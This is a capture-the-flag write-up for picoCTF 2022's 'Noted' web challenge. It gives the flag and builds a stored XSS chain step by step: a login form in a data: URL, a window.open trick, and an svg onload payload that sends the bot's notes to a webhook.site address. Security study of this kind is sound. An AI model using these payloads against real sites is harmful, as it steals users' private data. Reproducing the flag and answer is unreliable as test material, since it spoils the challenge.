  # picoCTF2022: Noted

![Contest Date: 15.03.2022](https://img.shields.io/badge/Contest%20Date-15.03.2022-lightgrey.svg)
![Solve Moment: During The Contest](https://img.shields.io/badge/Solve%20Moment-During%20The%20Contest-brightgreen.svg)
![Score: 500](https://img.shields.io/badge/Score-500-brightgreen.svg)

## Description

> I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right?
Note that the headless browser used for the "report" feature does not have access to the internet.




## Attached Files

- noted.tar.gz

## Flag

```
picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}
```

## Detailed Solution

After looking at the source, it seems that this is a website that allows to create an account, login, and create notes. The notes seem to be private, and only visible to the logged in user, and are not accessible through some URL. Looking at some past challenges and writeups that dealed with Notes. After searching online for these type of past challenges, we can get some results such as [TBDXSS](https://ctftime.org/task/17592) and [XSS On Other Domain](https://www.youtube.com/watch?v=9ecv6ILXrZo). Now we need to first see if our website is vurlnerable to XSS, so we can put in a sample test payload in our notes such as
```js
  <script>alert(1)</script>
```
Putting this in Notes, <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-06%20at%202.39.01%20PM.png)</p>

We get, <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-06%20at%202.43.57%20PM.png)</p>

Now we have confirmed that our website is vurlnerable to XSS. Now scanning through the writeups, the latter video seems especially helpful, because we want to craft a payload to get the flag on another domain. So now let's try to reiterate on what we exactly want to do. We want some payload, which our bot will run to steal it's notes which will contain the flag. However, we need to make the bot run this directly. Here's where I got multiple ideas on how to approach this. One of my initial plans was to directly fetch the notes of the bot, using the `fetch()` command, then taking that response, and sending it's text to our webhook which then would be the flag. But after trying it out, we would see that this would not work. After a lot of googling, we would see that this would be common in a lot of XSS challenges, and is caused by the CORS policy disabled. At this point, I tried searching up CORS Bypass, and got [Hacktricks](https://book.hacktricks.xyz/pentesting-web/cors-bypass) and got [Medium](https://medium.com/the-crazy-coder/a-comprehensive-understanding-of-cors-all-frontend-developers-better-to-have-3ae46d35f19e). Here, I went in to wrong direction for a while thinking that this would be promising idea, and after a lot of frusteration I decided that this is not the right path, and decided to change my logic. I then looked back at those writeups I had searched up in the beginning, and saw that we can either use a iframe or window to have the notes, then we can login. We also have it a bit easy, because we automatically go to the notes of the user, after we login. So here, I thought that would it be possible to somehow access that window we had opened before logging in? After some testing, and searching up how Windows work. It turned out YES! We can access that window that we opened and we keep it open as we login. Then the XSS can access the previously opened page's content because of same-origin. So now putting together our small broken up steps to get our plan, we first open a window of the bot's notes, then we can login as our temporary user. This will then access our temporary user's notes, where we can do XSS, to open our previously opened window of the bot's notes, which we can then send to our webhook as a GET request, where we can get the flag. Now that we have the plan, it's time to implement this and put it together. We can start off with the code we're going to inject in the Report function. To login as our user, we can use the <form> and <input> tags, with them put together as
```html
<form action="http://0.0.0.0:8080/login" method=POST id=WebsiteForm target=_blank>
<input type="text" name="username" value="test"><input type="text" name="password" value="test">
</form>
```

Then we want want to open up a window, with the bots notes and submit the form. To open up a window we can use `window.open()`, and to submit the form we can use ``setTimeout(`WebsiteForm.submit(), 1000`)``. Putting this together, we get 

```html
<form action="http://0.0.0.0:8080/login" method=POST id=WebsiteForm target=_blank>
<input type="text" name="username" value="test"><input type="text" name="password" value="test">
</form>
<script>window.open('http://0.0.0.0:8080/notes','window1');setTimeout(`WebsiteForm.submit()`)</script>
```

We also have to put this with data:text/html, so we actually get

```html
data:text/html,
<form action="http://0.0.0.0:8080/login" method=POST id=WebsiteForm target=_blank>
<input type="text" name="username" value="test"><input type="text" name="password" value="test">
</form>
<script>window.open('http://0.0.0.0:8080/notes','window1');setTimeout(`WebsiteForm.submit()`)</script>
```

Now we need to create the XSS we will use in our notes of the temporary user. So searching this up [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting), we can abuse some html tag. I chose to abuse the <svg tag, but you can use anything. Now, we want to open the window that has the bot's notes, and somehow send it to our webhook. After thinking about it, I realized that I can put it in the request itself, by putting the url of the webhook, and concatenating it with the note text. Putting this together we get,

```html
<svg onload="window.location='https://webhook.site/5ca98311-0281-432a-a3f7-6ebd23deb0dc/'+window.open('', 'window1').document.body.textContent">
```

Now we have our full payload, which *might* work. Let's try it out!

Now trying this out we get this in our webhook, <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-04%20at%207.43.03%20PM.png)</p>

Now URL Decoding this we get our flag :D, <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-04%20at%207.45.11%20PM.png)</p>
